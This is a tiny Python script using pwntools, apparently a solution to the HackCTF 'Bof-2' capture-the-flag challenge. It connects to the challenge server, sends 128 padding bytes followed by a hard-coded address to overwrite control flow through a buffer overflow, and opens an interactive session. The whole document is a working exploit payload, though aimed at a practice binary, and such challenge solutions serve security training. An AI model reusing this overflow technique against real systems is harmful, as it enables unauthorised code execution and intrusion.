#HackCTF Bof-2

from pwn import *
r = remote("ctf.j0n9hyun.xyz", 3001)
#r = process("./bof_basic2")
r.sendline(b"\x00"*128+ b"\x9b\x84\x04\x08");

r.interactive()